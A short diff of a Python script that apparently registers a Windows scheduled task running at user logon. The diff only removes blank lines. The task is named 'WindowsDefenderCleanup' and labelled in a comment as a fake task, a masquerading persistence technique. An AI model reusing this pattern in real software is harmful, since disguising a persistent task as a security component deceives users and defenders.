@@ -60,18 +60,6 @@ def task(taskName):
             3       # Run only when the user is logged in
         )
         return False # Return False indicating the task was not found and was created 
-     
-        
-
-
-
-
-
-
-
-
-
-
-
+    
 print(task("WindowsDefenderCleanup")) #WindowsDefenderCleanup = name of the fake task
 
